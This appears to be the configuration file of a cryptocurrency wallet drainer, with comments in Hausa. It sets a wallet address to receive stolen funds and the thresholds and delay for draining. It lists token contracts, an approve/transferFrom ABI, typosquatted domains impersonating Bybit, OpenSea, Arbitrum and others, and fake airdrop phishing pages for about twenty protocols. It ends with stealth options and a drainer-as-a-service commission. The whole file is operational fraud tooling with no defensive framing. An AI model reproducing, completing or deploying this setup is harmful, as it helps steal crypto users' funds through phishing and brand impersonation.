// ============================================
// DRAINER SETTINGS - CIKAKKEN NA GASKE
// ============================================

// 1. WALLET ADDRESS (Inda za a tura kuɗi)
const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";

// 2. MINIMUM BALANCE (Akalla nawa kafin a kwashe)
const minimumBalance = 50;

// 3. DELAY (Jinkiri kafin a kwashe - sa'o'i)
const delayHours = 2;

// 4. NETWORK
const network = "mainnet";

// 5. TOKEN SETTINGS
const tokenSymbol = "USDT";
const decimals = 18;

// 6. TOKEN ADDRESSES (Multi-Token Support)
const TOKEN_ADDRESSES = {
    USDT: "0x55d398326f99059ff775485246999027b3197955",
    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
    ETH: "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
    WBTC: "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c"
};

// 7. TOKEN ABI
const TOKEN_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) public view returns (uint256)"
];

// 8. FAKE DOMAINS (Typosquatting)
const FAKE_DOMAINS = [
    "bybit-airdrop.com",
    "bybit-claim.net",
    "bbit.com",
    "bybitsecure.com",
    "opensea-offer.net",
    "blur-rewards.com",
    "collab-verify.com",
    "arbitrum-claim.com",
    "optimism-airdrop.net",
    "zksync-rewards.com"
];

// 9. PHISHING PAGES
const PHISHING_PAGES = {
    'bnb': { title: 'BNB Airdrop', subtitle: 'Claim 500 BNB + 10,000 USDT', logo: '💰' },
    'opensea': { title: 'OpenSea - Exclusive Mint', subtitle: 'Mint your exclusive NFT collection now', logo: '🎨' },
    'blur': { title: 'Blur - Season 3 Rewards', subtitle: 'Claim your BLUR token rewards for Season 3', logo: '🌀' },
    'collab': { title: 'Collab.Land - Verification', subtitle: 'Verify your wallet to access exclusive content', logo: '🤝' },
    'airdrop': { title: 'New Protocol Airdrop', subtitle: 'Claim 10,000 tokens from the latest protocol launch', logo: '🚀' },
    'uniswap': { title: 'Uniswap - LP Rewards', subtitle: 'Claim your liquidity pool rewards', logo: '🦄' },
    'pancake': { title: 'PancakeSwap - CAKE Airdrop', subtitle: 'Claim 1,000 CAKE tokens', logo: '🥞' },
    'oneinch': { title: '1inch - Fusion Mode', subtitle: 'Claim rewards from Fusion Mode', logo: '🔷' },
    'aave': { title: 'Aave - Staking Rewards', subtitle: 'Claim your staking rewards', logo: '🏦' },
    'curve': { title: 'Curve Finance - veCRV', subtitle: 'Claim veCRV airdrop', logo: '📈' },
    'lido': { title: 'Lido - stETH Rewards', subtitle: 'Claim stETH rewards', logo: '💧' },
    'rocket': { title: 'Rocket Pool - rETH', subtitle: 'Claim rETH airdrop', logo: '🚀' },
    'arbitrum': { title: 'Arbitrum - ARB Claim', subtitle: 'Claim your ARB tokens', logo: '🔵' },
    'optimism': { title: 'Optimism - OP Claim', subtitle: 'Claim your OP tokens', logo: '🔴' },
    'zksync': { title: 'zkSync - ZK Airdrop', subtitle: 'Claim your ZK tokens', logo: '⚡' },
    'starknet': { title: 'StarkNet - STRK Claim', subtitle: 'Claim your STRK tokens', logo: '🌟' },
    'layerzero': { title: 'LayerZero - ZRO Airdrop', subtitle: 'Claim your ZRO tokens', logo: '🌐' },
    'wormhole': { title: 'Wormhole - W Claim', subtitle: 'Claim your W tokens', logo: '🕳️' },
    'eigenlayer': { title: 'EigenLayer - EIGEN', subtitle: 'Claim your EIGEN tokens', logo: '🔱' },
    'renzo': { title: 'Renzo - REZ Claim', subtitle: 'Claim your REZ tokens', logo: '💫' }
};

// 10. STEALTH SETTINGS
const stealthMode = true;
const retryAttempts = 3;
const gasMultiplier = 1.1;

// 11. DaaS SETTINGS (Drainer-as-a-Service)
const daasCommission = 20; // 20% ga operator
const affiliateEnabled = false;
const affiliateAddress = "0x0000000000000000000000000000000000000000";
